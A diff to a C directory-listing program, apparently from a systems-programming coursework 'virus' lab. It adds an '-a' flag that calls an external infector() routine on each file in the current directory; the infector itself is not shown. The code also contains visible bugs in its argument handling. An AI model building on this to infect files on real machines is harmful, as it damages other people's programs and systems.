@@ -3,6 +3,7 @@
 #include <dirent.h>
 extern int system_call();
 extern void infection();
+extern void infector();
 
 
 #define SYS_WRITE 4
@@ -45,23 +46,28 @@ int main (int argc , char* argv[], char* envp[]) {
     struct linux_dirent *d;
     int count;
     int i;
-    int flag;
+    int flagd;
+    int virus_flag;
     int write;
     char prefix[8192];
     int prefix_len;
-    char d_type;
     for (i = 1; i < argc ; i++) {
         if(argv[i][1] == 'D')
-            flag = 'D';
+            flagd = 'D';
         else if(argv[i][1] == 'p') {
             prefix_len = strlen(argv[i] - 2);
-            flag = 'p';
+            virus_flag = 'p';
+            strcat(prefix,argv[i] + 2);
+        }
+        else if (argv[i][1] == 'a') {
+            prefix_len = strlen(argv[i] - 2);
+            virus_flag = 'a';
             strcat(prefix,argv[i] + 2);
         }
 
     }
     fd = system_call(SYS_OPEN,".",0,0777);
-    print_to_err(SYS_OPEN,fd,flag);
+    print_to_err(SYS_OPEN,fd,flagd);
     if(fd < 0)
         system_call(1);
     int bpos;
@@ -69,21 +75,33 @@ int main (int argc , char* argv[], char* envp[]) {
 
     for ( ; ; ) {
         count = system_call(SYS_GETDENTS,fd,d,8192);
-        print_to_err(SYS_GETDENTS,count,flag);
+        print_to_err(SYS_GETDENTS,count,flagd);
         for (bpos = 0; bpos < count;) {
             d = (struct linux_dirent *) (buf + bpos);
-            d_type = *(buf + bpos + d->d_reclen - 1);
-            if(flag == 'p') {
+            char d_type = *(buf + bpos + d->d_reclen - 1);
+            if(virus_flag == 'p' || virus_flag == 'a') {
                 if(strncmp(prefix,d->d_name, prefix_len) == 0) {
-                    write = system_call(SYS_WRITE,STDOUT, strcat(d->d_name, "\n"), strlen(d->d_name) + 1);
-                    print_to_err(SYS_WRITE,write,flag);
+                    write = system_call(SYS_WRITE,STDOUT, d->d_name, strlen(d->d_name));
+                    print_to_err(SYS_WRITE,write,flagd);
+                    char* type = (d_type == 8) ?  " regular" :
+                                 (d_type == 4) ?  " directory" :
+                                 (d_type == 1) ? "  FIFO" :
+                                 (d_type == 12) ? " socket" :
+                                 (d_type == 10) ?  " symlink" :
+                                 (d_type == 6) ?  " block dev" :
+                                 (d_type == 2) ?  " char dev" : " Unknown";
+                    write = system_call(SYS_WRITE,STDOUT, type,strlen(type));
+                    print_to_err(SYS_WRITE,write,flagd);
+                    write = system_call(SYS_WRITE,STDOUT, "\n",1);
+                    print_to_err(SYS_WRITE,write,flagd);
                 }
+                if(virus_flag == 'a')
+                    infector(d->d_name);
 
             }
             else {
                 write = system_call(SYS_WRITE,STDOUT, strcat(d->d_name, "\n"), strlen(d->d_name) + 1);
-                print_to_err(SYS_WRITE,write,flag);
-                system_call(SYS_WRITE,STDOUT, itoa(d_type),1);
+                print_to_err(SYS_WRITE,write,flagd);
             }
             bpos = bpos + d->d_reclen;
 
